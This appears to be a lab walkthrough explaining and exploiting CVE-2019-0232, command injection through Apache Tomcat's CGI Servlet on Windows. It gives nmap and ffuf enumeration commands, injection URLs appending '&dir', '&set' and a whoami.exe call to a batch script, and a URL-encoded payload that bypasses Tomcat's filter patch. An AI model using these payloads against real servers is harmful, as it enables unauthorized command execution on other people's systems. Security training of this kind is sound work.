# Tomcat CGI Attacks

* The `enableCmdLineArguments` setting for Apache Tomcat's CGI Servlet controls whether command line arguments are created from the query string
  * &#x20;If set to true,
    * the CGI Servlet parses the query string and passes it to the CGI script as arguments.
* The CGI script can use command line arguments to switch between these actions. For instance, the script can be called with the following URL:

```http
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

* Here, the `action` parameter is set to `title`, indicating that the script should search by book title. The `query` parameter specifies the search term "the great gatsby."
* If the user wants to search by author, they can use a similar URL:

```http
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```

* However, a problem arises when `enableCmdLineArguments` is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script.
  * **This can lead to an operating system command injection attack, which allows an attacker to execute arbitrary commands on the target system by injecting them into another command.**
  * For instance, an attacker can append `dir` to a valid command using `&` as a separator to execute `dir` on a Windows system
  * If the attacker controls the input to a CGI script that uses this command, they can inject their own commands after `&` to execute any command on the server.
  * An example of this is `http://example.com/cgi-bin/hello.bat?&dir`, which passes `&dir` as an argument to `hello.bat` and executes `dir` on the server.
    * As a result, an attacker can exploit the input validation error of the CGI Servlet to run any command on the server.

### Enumeration

* Scan the target using `nmap`, this will help to pinpoint active services currently operating on the system.
* This process will provide valuable insights into the target, discovering what services, and potentially which specific versions are running, allowing for a better understanding of its infrastructure and potential vulnerabilities.

```shell-session
nmap -p- -sC -Pn 10.129.204.227 --open 
```

```shell-session
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
```

**Finding a CGI script**

* One way to uncover web server content is by utilising the `ffuf` web enumeration tool along with the `dirb common.txt` wordlist.
* Knowing that the default directory for CGI scripts is `/cgi`, either through prior knowledge or by researching the vulnerability, we can use the URL `http://10.129.204.227:8080/cgi/FUZZ.cmd` or `http://10.129.204.227:8080/cgi/FUZZ.bat` to perform fuzzing.

**Fuzzing Extentions - .CMD**

*   ### Fuzzing Extentions - .CMD

    ```shell-session
    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
    ```

**Fuzzing Extentions - .BAT**

*   ### Fuzzing Extentions - .BAT

    ```shell-session
    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
    ```

### Exploitation

* &#x20;we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`.
* We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`

```http
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

* Navigating to the above URL returns the output for the `dir` batch command, however trying to run other common windows command line apps, such as `whoami` doesn't return an output.
* Retrieve a list of environmental variables by calling the `set` command

```http
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

```http
Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
PROMPT=$P$G
QUERY_STRING=&set
REMOTE_ADDR=10.10.14.58
REMOTE_HOST=10.10.14.58
REMOTE_IDENT=
REMOTE_USER=
REQUEST_METHOD=GET
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

* From the list, we can see that the `PATH` variable has been unset, so we will need to hardcode paths in requests:

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

* The attempt was unsuccessful, and Tomcat responded with an error message indicating that an invalid character had been encountered.
* Apache Tomcat introduced a patch that utilises a regular expression to prevent the use of special characters.
* However, the filter can be bypassed by URL-encoding the payload.

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
